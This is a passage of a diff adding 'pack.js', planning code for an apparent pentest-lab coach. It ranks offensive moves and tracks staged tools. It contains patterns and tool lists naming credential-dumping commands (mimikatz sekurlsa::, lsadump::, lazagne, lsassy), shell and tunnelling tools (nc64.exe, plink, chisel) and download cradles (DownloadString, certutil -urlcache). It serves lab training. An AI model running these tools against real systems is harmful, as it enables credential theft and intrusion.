@@ -1,0 +1,5271 @@
+/*!
+ * obol engine - pack.js
+ * Methodology packs: fact-gated actions loaded from data, plus the planner. An Action is
+ * a methodology branch expressed as data: what facts must already be proven (`requires_*`),
+ * what a successful run can prove (`produces`, as fact kinds), and - conservatively - what
+ * it does *not* prove. The planner asks which actions the current facts unlock, which are
+ * blocked and why, and ranks the unlocked ones by the phase/frontier model.
+ *
+ * Faithful JS port of 
+ */
+(function (root) {
+  'use strict';
+  var OBOL = root.OBOL = root.OBOL || {};
+  var P = OBOL.phases;
+
+  var DEFAULT_PACK = 'ad_2026_09';
+  // Action packs loaded together by the planner (order is load order only; the planner
+  // ranks by each action's priority + phase, not pack order).
+  var PACK_NAMES = [
+    'ad_2026_09', 'web_2026_09', 'recon_2026_09',
+    'linux_privesc_2026_09', 'windows_privesc_2026_09',
+    'obol_local_pivot_2026_09', 'obol_flag_hunt_2026_09',
+    'findings_checks_2026_09', 'credential_access_2026_09',
+    'web_exploit_checks_2026_09', 'database_2026_09',
+    'cracking_2026_09', 'pivoting_2026_09', 'shells_2026_09',
+  ];
+
+  // ------------------------------------------------------- locus & scope --
+  // Two teaching/ranking dimensions every move carries. Both honor an explicit pack field when present
+  // (d.locus / d.scope) and otherwise DERIVE from the move's tool + gates, so new moves get a sensible
+  // default with zero data churn and the handful of judgment calls can be pinned in the override maps.
+  //
+  // locus - where you operate relative to the target host, lowest-friction first:
+  //   'R' remote/offline from Kali · 'F' one-shot code-exec on the box · 'I' interactive on-host session.
+  // The coach prefers R, then F, then I: staying off-host is faster and safer in a timed lab, and the
+  // on-host parsers are a safety net for when you are legitimately on the box, never a nudge to go there.
+  var LOCUS_REMOTE = { // run from Kali against the target, or offline on Kali - off-host either way
+    nmap: 1, rustscan: 1, masscan: 1, dig: 1, nslookup: 1, ffuf: 1, gobuster: 1, feroxbuster: 1, dirb: 1,
+    curl: 1, wget: 1, nikto: 1, wpscan: 1, whatweb: 1, 'gobuster-vhost': 1,
+    nxc: 1, netexec: 1, crackmapexec: 1, cme: 1, ldapsearch: 1, windapsearch: 1, smbmap: 1, smbclient: 1,
+    rpcclient: 1, enum4linux: 1, 'enum4linux-ng': 1, bloodyad: 1, showmount: 1, mount: 1,
+    kerbrute: 1, sprayhound: 1, targetedkerberoast: 1, certipy: 1, pywhisker: 1, kinit: 1, 'gpp-decrypt': 1,
+    'zerologon-scan': 1, sccmhunter: 1, pygpoabuse: 1,
+    ntlmrelayx: 1, responder: 1, coercer: 1, mitm6: 1,
+    hydra: 1, medusa: 1, sshpass: 1, ssh: 1, xfreerdp: 1, rdesktop: 1, mysql: 1, 'evil-winrm': 1,
+    hashcat: 1, john: 1, openssl: 1, 'bloodhound-python': 1, bloodhound: 1, msfvenom: 1, metasploit: 1,
+    nc: 1, ncat: 1, ntpdate: 1,
+  };
+  var LOCUS_ONHOST_INTERACTIVE = { // need a live session on the box (a .NET/PS tool, a dumper, a PEAS run)
+    mimikatz: 1, rubeus: 1, powerview: 1, sharphound: 1, sharpwsus: 1, sharpsccm: 1,
+    winpeas: 1, linpeas: 1, 'privesccheck': 1, powerup: 1, seatbelt: 1, 'les.sh': 1,
+  };
+  var LOCUS_ONHOST_ONESHOT = { // a single command you can fire through limited exec, no interactive shell
+    cmd: 1, sh: 1, bash: 1, powershell: 1, pwsh: 1, nltest: 1, klist: 1, whoami: 1, net: 1,
+  };
+  var LOCUS_ONHOST_FACTS = { // a gate that can only be satisfied once you already hold the box
+    'foothold.windows': 1, 'foothold.linux': 1, 'foothold.webshell': 1, 'access.shell': 1,
+    'access.system': 1, 'access.admin': 1, 'access.desktop': 1, 'access.root': 1,
+  };
+  var LOCUS_OVERRIDE = {
+    // impacket psexec/wmiexec/etc. and *.py coercers are launched FROM Kali even when they land a shell.
+    // These are caught by the impacket-/.py rules below; pin only genuine exceptions here, by move id.
+    'windows-old-hives': 'R'
+  };
+  function isOnhostGateFact(g) {
+    return !!(LOCUS_ONHOST_FACTS[g] || /^privesc\.|^blocker\.potato/.test(String(g || '')));
+  }
+  function deriveLocus(d) {
+    if (d.locus) return d.locus;
+    if (LOCUS_OVERRIDE[d.id]) return LOCUS_OVERRIDE[d.id];
+    var reqAll = d.requires_all || [];
+    if (reqAll.indexOf('foothold.linux') >= 0 || reqAll.indexOf('foothold.windows') >= 0) return 'F';
+    var tl = (d.tools && d.tools.length ? d.tools : [d.tool || '']).map(function (t) { return String(t || '').toLowerCase(); });
+    var anyRemote = tl.some(function (t) { return LOCUS_REMOTE[t] || t.indexOf('impacket-') === 0 || /\.py$/.test(t); });
+    if (anyRemote) return 'R';
+    if (tl.some(function (t) { return LOCUS_ONHOST_INTERACTIVE[t]; })) return 'I';
+    if (tl.some(function (t) { return LOCUS_ONHOST_ONESHOT[t]; })) return 'F';
+    // Tool unknown: fall back to the gates. A move that can only run once you hold the box is on-host.
+    var gates = reqAll.concat(d.requires_any || []);
+    for (var i = 0; i < gates.length; i++) if (isOnhostGateFact(gates[i])) return 'F';
+    return 'R'; // default: the remote-first assumption
+  }
+
+  // ---- per-COMMAND locus, for the Next Steps Remote/On-Host toggle ---------------------------------
+  // This is a DIFFERENT axis from the move-level ranking locus above. The ranking locus asks "where is it
+  // launched from" (prefer off-host). This asks the question a learner actually cares about: "does this
+  // command put me ON the host?" - because OSCP only counts a flag read from a session on the target. By
+  // this axis a tool that hands you a shell (ssh, evil-winrm, rdp, psexec) is ON-HOST even though it is
+  // launched from Kali; a tool that only interrogates or acts on the host from Kali (nmap, nxc, hydra) is
+  // REMOTE. A command may pin its own locus with d.locus on the command object for the rare odd case.
+  var CMD_ONHOST_SESSION = { // hands you an interactive session ON the box
+    ssh: 1, sshpass: 1, 'evil-winrm': 1, winrs: 1, telnet: 1, rlogin: 1, rsh: 1,
+    xfreerdp: 1, rdesktop: 1, 'xfreerdp3': 1, mstsc: 1,
+    psexec: 1, wmiexec: 1, smbexec: 1, atexec: 1, dcomexec: 1,
+    'impacket-psexec': 1, 'impacket-wmiexec': 1, 'impacket-smbexec': 1, 'impacket-atexec': 1, 'impacket-dcomexec': 1,
+    'psexec.py': 1, 'wmiexec.py': 1, 'smbexec.py': 1,
+  };
+  var CMD_ONHOST_RUN = { // a command you type once you already hold a session on the box
+    cmd: 1, sh: 1, bash: 1, zsh: 1, powershell: 1, pwsh: 1, 'cmd.exe': 1,
+    cat: 1, type: 1, find: 1, ls: 1, dir: 1, whoami: 1, id: 1, hostname: 1, ipconfig: 1, ifconfig: 1,
+    net: 1, 'net.exe': 1, nltest: 1, klist: 1, reg: 1, schtasks: 1, sc: 1, wmic: 1, dsquery: 1,
+    mimikatz: 1, rubeus: 1, 'rubeus.exe': 1, powerview: 1, sharphound: 1, 'sharphound.exe': 1,
+    winpeas: 1, 'winpeas.exe': 1, linpeas: 1, 'linpeas.sh': 1, privesccheck: 1, powerup: 1, seatbelt: 1, 'les.sh': 1,
+    pspy: 1, pspy64: 1, godpotato: 1, printspoofer: 1, juicypotato: 1, 'comsvcs.dll': 1, rundll32: 1,
+    sharpwsus: 1, sharpsccm: 1, lxc: 1, lxd: 1, docker: 1, kubectl: 1, systemctl: 1, uname: 1, sudo: 1, sudoedit: 1,
+    certutil: 1, juicypotatong: 1, accesschk: 1, 'accesschk.exe': 1, icacls: 1, msiexec: 1, fodhelper: 1,
+    diskshadow: 1, procmon: 1, screen: 1, tmux: 1, wsl: 1, busctl: 1, ln: 1, unzip: 1, strings: 1,
+    gcc: 1, 'g++': 1, cc: 1, make: 1, getcap: 1, getfacl: 1, setfacl: 1, crontab: 1, ps: 1, env: 1,
+  };
+  function isRemoteKaliCommand(cmd, t) {
+    var run = String((cmd && cmd.run) || '').trim();
+    if (!run) return false;
+    if ((t === 'net' || t === 'net.exe') && /^net\s+rpc\b/i.test(run)) return true;
+    if (t === 'sh' || t === 'bash' || t === 'zsh') {
+      if (/^(?:sudo\s+)?(?:nxc|netexec|crackmapexec|cme|kerbrute|ldapsearch|impacket-\S+|python3?\s+\S*(?:impacket|set_empty_pw|windows-exploit-suggester)|responder|ntlmrelayx(?:\.py)?|export\s+KRB5CCNAME=|sort\s+-u\b|grep\s+-(?:h|ri|rhoE)\b|jq\s+-r\s+.*\/tmp\/nxc|msfvenom\b|wesng\b|mount\s+-t\s+nfs\s+\{\{target\}\}|curl\b|for\s+\w+\s+in\s+.*;\s*do\s+curl|java\s+-jar\s+(?:ysoserial|jenkins-cli)|cd\s+gitloot\b|svn\s+log\b|ls\s+\/usr\/share\/webshells|cp\s+\/usr\/share\/webshells)/i.test(run)) return true;
+      if (/\/etc\/hosts\b|\/etc\/responder\b|base64\s+-d\b|import\s+jwt\b|<\?php\b|<script>|Create TWO accounts/i.test(run)) return true;
+      if (/\b(?:nxc|netexec|kerbrute|ldapsearch|impacket-\S+|responder|ntlmrelayx)\b/i.test(run) && /\{\{target\}\}|\{\{dc_ip\}\}|\{\{dc_fqdn\}\}/.test(run)) return true;
+    }
+    return false;
+  }
+  // on-host if the command (or its tool) pins it, or its tool grants / runs within a session; else remote.
+  function commandLocus(cmd) {
+    if (!cmd) return 'remote';
+    if (cmd.locus === 'onhost' || cmd.locus === 'remote') return cmd.locus;
+    var t = String((cmd.tool || cmd.tools && cmd.tools[0] || '')).toLowerCase();
+    if (isRemoteKaliCommand(cmd, t)) return 'remote';
+    if (CMD_ONHOST_SESSION[t] || CMD_ONHOST_RUN[t]) return 'onhost';
+    return 'remote';
+  }
+  // Authentication context uses where the command is entered, independently of
+  // the UI posture above. A remote session launcher still needs remote proof.
+  function commandExecutionLocus(cmd) {
+    if (!cmd) return 'remote';
+    if (cmd.executionLocus === 'onhost' || cmd.executionLocus === 'remote') return cmd.executionLocus;
+    if (cmd.locus === 'remote') return 'remote';
+    var t = String((cmd.tool || cmd.tools && cmd.tools[0] || '')).toLowerCase();
+    if (isRemoteKaliCommand(cmd, t)) return 'remote';
+    if (cmd.locus === 'onhost' && !CMD_ONHOST_SESSION[t]) return 'onhost';
+    return CMD_ONHOST_RUN[t] ? 'onhost' : 'remote';
+  }
+  function commandIsOnHost(cmd) { return commandLocus(cmd) === 'onhost'; }
+  // A move's command loci at a glance: does it offer remote commands, on-host commands, or both? The
+  // Remote/On-Host toggle only appears when a move genuinely spans both eligible, plausible commands.
+  function moveCommandLoci(move, facts) {
+    var r = false, h = false, cs = (move && move.commands) || [];
+    for (var i = 0; i < cs.length; i++) {
+      if (commandSettled(cs[i], facts)) continue;
+      if (facts && facts.forAction && move && typeof move.eligible === 'function' && !move.eligible(facts.forAction(move, cs[i]))) continue;
+      if (!commandIsEligible(cs[i], facts, move)) continue;
+      if (commandIsOnHost(cs[i])) h = true; else r = true;
+      if (r && h) break;
+    }
+    return { remote: r, onhost: h, both: r && h };
+  }
+  // The toggle's default side: Remote everywhere (off-host is faster and safer) EXCEPT a flag-capture move,
+  // which must default On-Host because a remote flag read scores zero on the exam.
+  var OBJECTIVE_FLAG_RE = /^objective\.(flag|local_flag|root_flag)$/;
+  function defaultCommandLocus(move, facts) {
+    // A recovered credential can be tested by a remote proof attempt before an
+    // elevated session exists. Show that attempt first when no on-host launcher is open.
+    if (facts && move && move.credential_probe) {
+      var probeFacts2 = facts.forAction ? facts.forAction(move, (move.commands || [])[0]) : facts;
+      var hasInteractiveShellPort = probeFacts2.has('winrm.reachable') || probeFacts2.has('port:5985') || probeFacts2.has('rdp.reachable') || probeFacts2.has('port:3389');
+      if (!probeFacts2.has('access.admin') && !probeFacts2.has('access.system') && !hasInteractiveShellPort && credentialProbeAllowed(move, probeFacts2)) return 'remote';
+    }
+    var prod = (move && move.produces) || [];
+    var isShellOrFlagMove = !!(move && (move.transition === 'foothold_win' || move.id === 'win-interactive-shell'));
+    for (var i = 0; i < prod.length; i++) {
+      if (OBJECTIVE_FLAG_RE.test(prod[i])) { isShellOrFlagMove = true; break; }
+    }
+    if (isShellOrFlagMove) {
+      var hasSessionOrLauncher = !facts || (
+        facts.has('foothold.windows') || facts.has('foothold.linux') ||
+        facts.has('winrm.authenticated') || facts.has('ssh.authenticated') ||
+        facts.has('access.shell') || facts.has('access.admin_shell') ||
+        facts.has('access.desktop') || facts.has('access.system') || facts.has('access.root') ||
+        ((move.commands || []).some(function (c) {
+          var t = String((c && (c.tool || (c.tools && c.tools[0]))) || '').toLowerCase();
+          if (!CMD_ONHOST_SESSION[t] || commandLocus(c, move) !== 'onhost') return false;
+          var cf = facts.forAction ? facts.forAction(move, c) : facts;
+          if ((move.eligible && !move.eligible(cf)) || !commandIsEligible(c, cf, move)) return false;
+          if (root.OBOL && root.OBOL.command && root.OBOL.command.commandPortFeasible) {
+            if (root.OBOL.command.commandPortFeasible(c, cf).feasible === false) return false;
+          }
+          return true;
+        }))
+      );
+      if (hasSessionOrLauncher) return 'onhost';
+    }
+    var loci = moveCommandLoci(move, facts);
+    if (loci.onhost && !loci.remote) return 'onhost';
+    if (loci.remote && !loci.onhost) return 'remote';
+    if (move && loci.onhost && facts && (facts.has('foothold.windows') || facts.has('foothold.linux') || facts.has('access.shell') || facts.has('access.admin_shell') || facts.has('access.desktop') || facts.has('winrm.authenticated'))) {
+      var reqs = [].concat(move.requires_all || [], move.requires_any || []);
+      var isLocalOrPostFoothold = move.phase === 'escalate' || move.phase === 'privesc'
+        || /^(?:mysql|postgres|redis|mongodb|sqlite|mssql)-(?:login|loot|enum|rce|file-read|udf-privesc)$|^(?:windows|linux)-enum$|^local-|^post-proof-loot-sweep$|^stored-credentials$|^defense-enum$|^linux-loot-hunt$|^windows-privesc-/.test(move.id || '')
+        || reqs.some(function (r) { return /^(?:foothold\.|access\.(?:shell|admin_shell|desktop)|privesc\.|scan\.local\.)/.test(r); });
+      if (isLocalOrPostFoothold) return 'onhost';
+    }
+    return 'remote';
+  }
+
+  var STAGED_ONHOST_TOOLS = [
+    { key: 'mimikatz', file: 'mimikatz.exe', os: 'windows', label: 'mimikatz.exe', re: /\bmimikatz(?:\.exe)?\b|(?:^|\s)(?:privilege::debug|sekurlsa::|lsadump::|dpapi::|kerberos::|crypto::|token::elevate|vault::)/i },
+    { key: 'rubeus', file: 'Rubeus.exe', os: 'windows', label: 'Rubeus.exe', re: /\brubeus(?:\.exe)?\b/i },
+    { key: 'sharphound', file: 'SharpHound.exe', os: 'windows', label: 'SharpHound.exe', re: /\bsharphound(?:\.exe|\.ps1)?\b|\bInvoke-BloodHound\b/i },
+    { key: 'powerview', file: 'PowerView.ps1', os: 'windows', label: 'PowerView.ps1', re: /\bpowerview(?:\.ps1)?\b|\b(?:Get-NetDomain|Get-NetUser|Get-NetGroup|Get-NetComputer|Get-NetSession|Get-DomainUser|Get-DomainGroup|Get-DomainGroupMember|Get-DomainComputer|Get-DomainObjectAcl|Get-ObjectAcl|Add-DomainObjectAcl|Find-LocalAdminAccess|Find-InterestingDomainAcl|Invoke-ShareFinder|Get-DomainTrust|Convert-SidToName|Set-DomainUserPassword)\b/i },
+    { key: 'powerup', file: 'PowerUp.ps1', os: 'windows', label: 'PowerUp.ps1', re: /\bpowerup(?:\.ps1)?\b|\bInvoke-AllChecks\b|\bWrite-ServiceBinary\b|\bInstall-ServiceBinary\b|\bInvoke-ServiceAbuse\b/i },
+    { key: 'powerupsql', file: 'PowerUpSQL.ps1', os: 'windows', label: 'PowerUpSQL.ps1', re: /\bpowerupsql(?:\.ps1)?\b|\bGet-SQLInstanceDomain\b/i },
+    { key: 'winpeas', file: 'winPEASx64.exe', os: 'windows', label: 'winPEASx64.exe', re: /\bwinpeas[a-z0-9_-]*(?:\.exe|\.bat|\.ps1)?\b/i },
+    { key: 'privesccheck', file: 'PrivescCheck.ps1', os: 'windows', label: 'PrivescCheck.ps1', re: /\bprivesccheck(?:\.ps1)?\b|\bInvoke-PrivescCheck\b/i },
+    { key: 'seatbelt', file: 'Seatbelt.exe', os: 'windows', label: 'Seatbelt.exe', re: /\bseatbelt(?:\.exe)?\b/i },
+    { key: 'sharpup', file: 'SharpUp.exe', os: 'windows', label: 'SharpUp.exe', re: /\bsharpup(?:\.exe)?\b/i },
+    { key: 'printspoofer', file: 'PrintSpoofer64.exe', os: 'windows', label: 'PrintSpoofer64.exe', re: /\bprintspoofer(?:64|32)?(?:\.exe)?\b/i },
+    { key: 'godpotato', file: 'GodPotato-NET4.exe', os: 'windows', label: 'GodPotato-NET4.exe', re: /\bgodpotato[a-z0-9_-]*(?:\.exe)?\b/i },
+    { key: 'juicypotato', file: 'JuicyPotato.exe', os: 'windows', label: 'JuicyPotato.exe', re: /\bjuicypotato(?:ng)?(?:\.exe)?\b/i },
+    { key: 'sweetpotato', file: 'SweetPotato.exe', os: 'windows', label: 'SweetPotato.exe', re: /\bsweetpotato(?:\.exe)?\b/i },
+    { key: 'roguepotato', file: 'RoguePotato.exe', os: 'windows', label: 'RoguePotato.exe', re: /\broguepotato(?:\.exe)?\b/i },
+    { key: 'runascs', file: 'RunasCs.exe', os: 'windows', label: 'RunasCs.exe', re: /\brunascs(?:\.exe)?\b|\bInvoke-RunasCs\b/i },
+    { key: 'certify', file: 'Certify.exe', os: 'windows', label: 'Certify.exe', re: /\bcertify(?:\.exe)?\b/i },
+    { key: 'whisker', file: 'Whisker.exe', os: 'windows', label: 'Whisker.exe', re: /\bwhisker(?:\.exe)?\b/i },
+    { key: 'krbrelayup', file: 'KrbRelayUp.exe', os: 'windows', label: 'KrbRelayUp.exe', re: /\bkrbrelayup(?:\.exe)?\b/i },
+    { key: 'sharpgpoabuse', file: 'SharpGPOAbuse.exe', os: 'windows', label: 'SharpGPOAbuse.exe', re: /\bsharpgpoabuse(?:\.exe)?\b/i },
+    { key: 'sharpsccm', file: 'SharpSCCM.exe', os: 'windows', label: 'SharpSCCM.exe', re: /\bsharpsccm(?:\.exe)?\b/i },
+    { key: 'sharpwsus', file: 'SharpWSUS.exe', os: 'windows', label: 'SharpWSUS.exe', re: /\bsharpwsus(?:\.exe)?\b/i },
+    { key: 'sharprdp', file: 'SharpRDP.exe', os: 'windows', label: 'SharpRDP.exe', re: /\bsharprdp(?:\.exe)?\b/i },
+    { key: 'sharpdpapi', file: 'SharpDPAPI.exe', os: 'windows', label: 'SharpDPAPI.exe', re: /\bsharpdpapi(?:\.exe)?\b/i },
+    { key: 'sharpchrome', file: 'SharpChrome.exe', os: 'windows', label: 'SharpChrome.exe', re: /\bsharpchrome(?:\.exe)?\b/i },
+    { key: 'lazagne', file: 'lazagne.exe', os: 'windows', label: 'lazagne.exe', re: /\blazagne(?:\.exe)?\b/i },
+    { key: 'snaffler', file: 'Snaffler.exe', os: 'windows', label: 'Snaffler.exe', re: /\bsnaffler(?:\.exe)?\b/i },
+    { key: 'accesschk', file: 'accesschk64.exe', os: 'windows', label: 'accesschk64.exe', re: /\baccesschk(?:64)?(?:\.exe)?\b/i },
+    { key: 'psexec_sysinternals', file: 'PsExec64.exe', os: 'windows', label: 'PsExec64.exe', re: /(?:^|[\\/\s])psexec(?:64)?\.exe\b/i },
+    { key: 'procdump', file: 'procdump64.exe', os: 'windows', label: 'procdump64.exe', re: /\bprocdump(?:64)?(?:\.exe)?\b/i },
+    { key: 'hollows_hunter', file: 'hollows_hunter.exe', os: 'windows', label: 'hollows_hunter.exe', re: /\bhollows_hunter(?:\.exe)?\b/i },
+    { key: 'nc64', file: 'nc64.exe', os: 'windows', label: 'nc64.exe', re: /\bnc(?:64)?\.exe\b/i },
+    { key: 'plink', file: 'plink.exe', os: 'windows', label: 'plink.exe', re: /\bplink(?:\.exe)?\b/i },
+    { key: 'domainpasswordspray', file: 'DomainPasswordSpray.ps1', os: 'windows', label: 'DomainPasswordSpray.ps1', re: /\bDomainPasswordSpray(?:\.ps1)?\b|\bInvoke-DomainPasswordSpray\b/i },
+    { key: 'powermad', file: 'Powermad.ps1', os: 'windows', label: 'Powermad.ps1', re: /\bPowermad(?:\.ps1)?\b|\bNew-MachineAccount\b/i },
+    { key: 'adpeas', file: 'adPEAS.ps1', os: 'windows', label: 'adPEAS.ps1', re: /\badPEAS(?:\.ps1)?\b|\bInvoke-adPEAS\b/i },
+    { key: 'azure_ad_connect', file: 'Azure-AD-Connect.ps1', os: 'windows', label: 'Azure-AD-Connect.ps1', re: /\bAzure-AD-Connect(?:\.ps1)?\b/i },
+    { key: 'linpeas', file: 'linpeas.sh', os: 'linux', label: 'linpeas.sh', re: /\blinpeas(?:\.sh)?\b/i },
+    { key: 'pspy', file: 'pspy64', os: 'linux', label: 'pspy64', re: /\bpspy(?:64|32)?\b/i },
+    { key: 'lse', file: 'lse.sh', os: 'linux', label: 'lse.sh', re: /(?:^|[\\/\s])lse\.sh\b/i },
+    { key: 'linenum', file: 'LinEnum.sh', os: 'linux', label: 'LinEnum.sh', re: /\bLinEnum(?:\.sh)?\b/i },
+    { key: 'les', file: 'les.sh', os: 'linux', label: 'les.sh', re: /(?:^|[\\/\s])les\.sh\b|\blinux-exploit-suggester(?:\.sh)?\b/i }
+  ];
+
+  function requiredStagedTool(cmd, facts) {
+    if (!cmd) return null;
+    if (commandLocus(cmd) !== 'onhost') return null;
+    var runStr = String(cmd.run || '');
+    if (/\b(?:DownloadString|DownloadFile|Invoke-WebRequest|iwr\s+-|wget\s+|curl\s+-[a-zA-Z]*s|certutil\s+-urlcache)\b/i.test(runStr) && /https?:\/\//i.test(runStr)) {
+      return null;
+    }
+    for (var i = 0; i < STAGED_ONHOST_TOOLS.length; i++) {
+      var st = STAGED_ONHOST_TOOLS[i];
+      if (st.re.test(runStr)) return st;
+    }
+    if (/\bchisel\.exe\b/i.test(runStr)) return { key: 'chisel_win', file: 'chisel.exe', os: 'windows', label: 'chisel.exe' };
+    if (/(?:^|[\\/\s])\.?\/?chisel\s+(?:client|server)\b/i.test(runStr)) return { key: 'chisel_linux', file: 'chisel', os: 'linux', label: 'chisel' };
+    return null;
+  }
+
+  function isToolStagedOnHost(cmdOrTool, facts, opts) {
+    if (!cmdOrTool) return true;
+    var st = (cmdOrTool.key && cmdOrTool.file) ? cmdOrTool : requiredStagedTool(cmdOrTool, facts);
+    if (!st) return true;
+    var wantKey = String(st.key || '').toLowerCase();
+    var wantFile = String(st.file || '').toLowerCase();
+    var wantStem = wantFile.replace(/\.(?:exe|ps1|sh|bat|py)$/i, '');
+    if (facts && typeof facts.values === 'function') {
+      var stagedVals = facts.values('host.tool_staged') || [];
+      for (var i = 0; i < stagedVals.length; i++) {
+        var v = stagedVals[i];
+        if (!v) continue;
+        var vk = String(v.tool || v.key || '').toLowerCase();
+        var vf = String(v.file || v.filename || v.path || '').split(/[\\/]/).pop().toLowerCase();
+        var vStem = vf.replace(/\.(?:exe|ps1|sh|bat|py)$/i, '');
+        if ((wantKey && vk === wantKey) || (wantFile && vf === wantFile) || (wantStem && (vk === wantStem || vStem === wantStem))) {
+          return true;
+        }
+      }
+    }
+    if (!(opts && opts.factsOnly) && wantKey && OBOL.store && typeof OBOL.store.active === 'function') {
+      var eng = OBOL.store.active();
+      var pd = eng && eng.ui && eng.ui.prepDone;
+      if (pd) {
+        var tgtIp = (facts && (facts._targetIp || (facts.context && facts.context.target) || (facts._resolvedContext && facts._resolvedContext.target)))
+          || (eng && eng.params && eng.params.target)
+          || 'host';
+        if (pd['stage:' + tgtIp + ':' + wantKey] || pd['stage:host:' + wantKey] || pd['stage_tool:' + tgtIp + ':' + wantKey] || pd['stage_tool:host:' + wantKey]) return true;
+      }
+    }
+    return false;
+  }
+
+  // ---- house toolkit preference ----------------------------------------------------------------
+  // NetExec (nxc) is the house tool for the SMB/LDAP/WinRM/RDP/MSSQL/FTP surface. When a move offers the
+  // same job through nxc AND an overlapping legacy tool (smbmap, enum4linux(-ng), rpcclient, smbclient),
+  // the nxc command is the default shown, and among nxc commands a SWITCHLESS probe (connect + auth, no
+  // action switch) leads so "do I even have anonymous/credentialed access?" is answered before the heavy
+  // enumeration runs. This is ONE global rule expressed as tool-class DATA (the same shape as LOCUS_REMOTE),
+  // applied as a tie-break and a default-pick, never a per-move hand-tuned rank.
+  var PREFERRED_TOOLKIT = { nxc: 1, netexec: 1, crackmapexec: 1, cme: 1, 'bloodhound-python': 1 };
+  function commandTool(cmd) {
+    var t = String((cmd && (cmd.tool || (cmd.tools && cmd.tools[0]))) || '').toLowerCase();
+    if (t) return t;
+    var m = String((cmd && cmd.run) || '').trim().match(/^(\S+)/);
+    return m ? m[1].toLowerCase() : '';
+  }
+  function commandToolkitRank(cmd) { return PREFERRED_TOOLKIT[commandTool(cmd)] ? 0 : 1; }
+  // nxc flags that only connect/authenticate (not an action). A command whose only flags are these is a
+  // bare probe. Everything else after the target (--shares, --users, --rid-brute, -M <module>, -x, …) is an
+  // action, so the command is NOT a switchless probe.
+  var NXC_CONN_FLAGS = { '-u': 1, '-p': 1, '-d': 1, '-H': 1, '-k': 1, '--port': 1, '--local-auth': 1,
+    '--hashes': 1, '--aesKey': 1, '--domain': 1, '--kdcHost': 1, '--no-pass': 1 };
+  function isSwitchlessProbe(cmd) {
+    if (commandToolkitRank(cmd) !== 0) return false;
+    var toks = String((cmd && cmd.run) || '').trim().split(/\s+/);
+    for (var i = 3; i < toks.length; i++) {   // 0=nxc 1=proto 2=target; scan the remainder
+      var t = toks[i];
+      if (t.charAt(0) !== '-') continue;       // a value (e.g. '' after -u) or a bare token, not a flag
+      if (!NXC_CONN_FLAGS[t]) return false;    // a real action flag or module -> not a bare probe
+    }
+    return true;
+  }
+  // A command can declare it is answered once a fact exists (settled_by: [kind,…]), so a one-shot probe
+  // drops out of the move after it has done its job: the switchless null-session probe disappears once
+  // smb.null_session / smb.guest_session is proven, rather than nagging you to re-run it every render.
+  function commandSettled(cmd, facts) {
+    if (!facts || !cmd) return false;
+    var cmdRun = String((cmd && cmd.run) || '');
+    if (/(?:^|\s)--sam\b/i.test(cmdRun) && /(?:^|\s)--lsa\b/i.test(cmdRun) && (facts.has('loot.sam') || facts.has('loot.lsa'))) {
+      return true;
+    }
+    if (/(?:^|\s)-M\s+lsassy\b/i.test(cmdRun) && (facts.has('loot.lsass') || (Array.isArray(facts.facts) && facts.facts.some(function (f) { return f && f.state === 'supported' && f.value && (f.value.via === 'lsassy' || f.value.method === 'lsassy'); })))) {
+      return true;
+    }
+    var sb = cmd.settled_by || cmd.settledBy; if (!sb || !sb.length) return false;
+    for (var i = 0; i < sb.length; i++) {
+      var s = sb[i];
+      if (s === 'access.shell') {
+        if (/\bssh\b/i.test(cmdRun)) { if (!facts.has('ssh.authenticated')) continue; var cSeq = (facts._resolvedContext && Array.isArray(facts._resolvedContext.allScopedFacts)) ? facts._resolvedContext.allScopedFacts : (Array.isArray(facts.facts) ? facts.facts : []); var lastSshIdx = -1, lastCredOrKeyIdx = -1; for (var csi = 0; csi < cSeq.length; csi++) { var csf = cSeq[csi]; if (!csf || (csf.state && csf.state !== 'supported')) continue; if (csf.kind === 'ssh.authenticated') lastSshIdx = csi; else if (csf.kind === 'loot.ssh_key' || csf.kind === 'credential.ssh_key' || csf.kind === 'credential.available' || csf.kind === 'credential.plaintext' || csf.kind === 'credential.password') lastCredOrKeyIdx = csi; } if (lastSshIdx < 0 || lastCredOrKeyIdx > lastSshIdx) continue; return true; } if (facts.has('access.shell') || (!cmd.requires_admin && (facts.has('foothold.windows') || facts.has('foothold.linux')))) return true;
+        continue;
+      }
+      if (s === 'access.admin_shell') {
+        var hostHasAdmin = facts.has('access.admin') || facts.has('access.system');
+        var adminUserSet = {};
+        (facts.values('access.admin') || []).forEach(function (av) {
+          var au = String((av && (av.user || av.username || av.identity)) || '').trim().toLowerCase();
+          if (au) adminUserSet[au.split('\\').pop().split('@')[0]] = 1;
+        });
+        var isKnownAdminUser = function (u) {
+          var clean = String(u || '').trim().toLowerCase().split('\\').pop().split('@')[0];
+          if (!clean) return hostHasAdmin;
+          if (/^administrator$/i.test(clean)) return true;
+          return !!adminUserSet[clean];
+        };
+        var hasAdminShell = (facts.values('winrm.authenticated') || []).some(function (v) {
+          return v && v.tool === 'evil-winrm' && (v.admin || isKnownAdminUser(v.user || v.username));
+        }) || (facts.values('access.desktop') || []).some(function (v) {
+          return v && (v.admin || isKnownAdminUser(v.user || v.identity) || /^(?:wmiexec|psexec|smbexec|atexec|dcomexec)$/i.test(String(v.session || '')));
+        });
+        if (hasAdminShell) return true;
+        continue;
+      }
+      if (s === 'ad.gpp_xml') {
+        var hasGppXml = (facts.values('config.review') || []).some(function (v) { return v && v.kind === 'gpp_xml'; })
+          || (facts.values('credential.candidate') || []).some(function (v) { return v && (v.kind === 'gpp_cpassword' || v.kind === 'gpp_plaintext'); });
+        if (hasGppXml) return true;
+        continue;
+      }
+      if (s === 'ad.gpp_cpassword') {
+        var hasCpass = (facts.values('credential.candidate') || []).some(function (v) { return v && (v.kind === 'gpp_cpassword' || v.kind === 'gpp_plaintext'); });
+        if (hasCpass) return true;
+        continue;
+      }
+      if (s === 'objective.flag_located') {
+        var isSessionLauncher = (!!CMD_ONHOST_SESSION[commandTool(cmd)] || sb.indexOf('access.desktop') >= 0 || sb.indexOf('access.shell') >= 0 || sb.indexOf('access.admin_shell') >= 0) && commandLocus(cmd) === 'onhost';
+        if (isSessionLauncher) continue;
+        var text = (cmd.run || '') + ' ' + (cmd.note || '');
+        var isRoot = sb.indexOf('access.admin_shell') >= 0 || /(?:[*\\/.]|flag_path_)root\b|(?:[*\\/.]|flag_path_)proof\b|root\.txt|proof\.txt|root\/proof|Administrator(?:\.[A-Za-z0-9_-]+)?\\+Desktop/i.test(text);
+        var isLocal = /(?:[*\\/.]|flag_path_)local\b|user\.txt|local\.txt|\*user\*\.txt|\buser flag\b/i.test(text);
+        if (isRoot) {
+          var hasRoot = (facts.values('objective.flag_located') || []).some(function (v) { return v && v.slot === 'root' && (!isSessionLauncher || v.on_host !== false); })
